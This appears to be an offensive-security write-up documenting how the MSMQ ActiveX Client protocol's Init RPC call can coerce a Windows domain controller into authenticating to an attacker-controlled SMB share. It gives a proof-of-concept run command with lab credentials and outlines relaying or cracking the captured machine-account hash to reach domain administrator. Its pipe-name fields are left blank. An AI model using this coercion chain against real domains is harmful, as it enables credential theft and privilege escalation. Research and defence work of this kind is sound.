# MC-MQAC - Remote call to Init (opnum 7)

## Summary

+ **Protocol**: [[MC-MQAC]: Message Queuing (MSMQ): ActiveX Client Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/5ed096a9-b641-4a5a-b749-7e6937d20f4d)

+ **Protocol UUID**: 0fb15084-af41-11ce-bd2b-204c4f4f5020

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`Init`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/13f4d2bf-3c1d-4ef0-825a-a497df73bf5b)

+ **Function operation number**: `7`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MC-MQAC`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/5ed096a9-b641-4a5a-b749-7e6937d20f4d) protocol (with uuid `0fb15084-af41-11ce-bd2b-204c4f4f5020` and version `0.0`) in order to perform remote procedure calls to functions in the [`MC-MQAC`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/5ed096a9-b641-4a5a-b749-7e6937d20f4d) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MC-MQAC]: Message Queuing (MSMQ): ActiveX Client Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/5ed096a9-b641-4a5a-b749-7e6937d20f4d) and allows to call RPC functions of this protocol. We will then call the remote [`Init`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/13f4d2bf-3c1d-4ef0-825a-a497df73bf5b) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
Init('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT Init(
   [in, optional] VARIANT* Machine,
   [in, optional] VARIANT* Pathname,
   [in, optional] VARIANT* FormatName
 );
```

## References

+ Documentation of protocol [MC-MQAC]: Message Queuing (MSMQ): ActiveX Client Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/5ed096a9-b641-4a5a-b749-7e6937d20f4d

+ Documentation of function `Init`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-mqac/13f4d2bf-3c1d-4ef0-825a-a497df73bf5b